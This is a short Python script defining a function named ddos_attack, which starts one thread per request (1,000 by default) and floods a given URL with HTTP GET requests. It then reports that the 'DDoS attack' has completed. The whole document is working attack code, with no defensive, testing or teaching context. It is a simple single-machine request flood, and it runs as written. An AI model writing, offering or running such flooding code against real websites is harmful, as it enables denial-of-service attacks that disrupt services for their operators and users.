import requests
import threading

def ddos_attack(target_url, num_requests=1000):
    def send_request():
        try:
            response = requests.get(target_url)
            print(f"Request sent to {target_url}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
    
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"DDoS attack completed on {target_url}")
